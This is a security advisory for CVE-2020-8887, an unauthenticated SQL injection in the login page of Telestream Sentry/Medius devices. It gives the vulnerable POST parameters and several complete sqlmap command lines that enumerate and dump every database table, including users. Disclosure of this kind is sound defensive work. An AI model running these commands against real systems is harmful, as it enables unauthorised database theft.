---
title: ' Telestream: SQL injection in Sentry/Medius'
published: '2020-09-16T18:12:57Z'
severity: High
ghsa_id: GHSA-g69r-8jwh-2462
cve_id: CVE-2020-8887
weaknesses: []
products:
- ecosystem: ''
  package_name: Sentry/Medius
  affected_versions: < 10.7.5
  patched_versions: '> 10.7.5'
cvss: null
credits:
- github_user_id: securitygoon
  name: Matt Bell
  avatar: https://avatars.githubusercontent.com/u/69655154?s=40&v=4
---

### Summary
A SQL Injection Vulnerability was discovered by Matt Bell of Google Fiber Security in the following platforms:
- Telestream/Tektronix Sentry running 10.6.6 (and likely versions previous to 10.7.5)
- Telestream/Tektronix Medius running 10.6.2 (and likely versions previous to 10.7.5)

This vulnerability allows an unauthenticated attacker to perform SQL injection on the device, causing the device to return information stored in the system databases. This includes databases, tables, channel/feed subscriptions, etc. 

### Severity
This is a high severity vulnerability for users of this platform as the attack can be conducted with no authentication and allows the exposure of database information.  An unauthenticated attacker can enumerate and dump the contents of the databases stored on the system. 

### Proof of Concept
The attack vector is a SQL injection vuln in index.php via POST to "_z=0&page=login&username=admin&passwd=1234&submit=+Log+In+"

### Further Analysis
**This was the initial command I ran to get the databases, schemas, tables, etc, using sqlmap for efficiency:**
sqlmap -u "http:///" --data="_z=0&page=login&username=admin&passwd=1234&submit=+Log+In+" --cookie="PHPSESSID=408c5b3c721a5da3b610aa6516be313d" --level=1 --risk=3 --batch --dbms=PostgreSQL --dump-format=csv --method=POST --current-user

**Then for the sake of efficiency, you can tune the scan to use specific databases and tables you find and start dumping tables...**
sqlmap -u "http:///" --data="_z=0&page=login&username=admin&passwd=1234&submit=+Log+In+" --cookie="PHPSESSID=408c5b3c721a5da3b610aa6516be313d" --level=3 --risk=3 --batch --dbms=PostgreSQL --dump-format=csv --method=POST --threads=3 -D public --count --output-dir=./

sqlmap -u "http:///" --data="_z=0&page=login&username=admin&passwd=1234&submit=+Log+In+" --cookie="noscript=0; PHPSESSID=408c5b3c721a5da3b610aa6516be313d" --level=3 --risk=3 --batch --dbms=PostgreSQL --dump-format=csv --method=POST --threads=3 -D public -T users --count --output-dir=./

**This command takes MUCH longer to run, but will enumerate all databases and tables and log all findings to a CSV file. I was able to dump the contents of all the tables it found.** 
sqlmap -u "http:///" --data="_z=0&page=login&username=admin&passwd=1234&submit=+Log+In+" --cookie="noscript=0; PHPSESSID=5c71d6d59352a4313bf1200f9cbdf97" --level=3 --risk=3 --batch --dbms=PostgreSQL --dump-format=csv --method=POST --threads=3 -D public -T system_identification --columns --schema --dump-all --comments --count --output-dir=./

### Timeline
__Date reported__:  October 8th, 2019
__Date fixed__:   December. 18th 2019
__Date disclosed__: September 1, 2020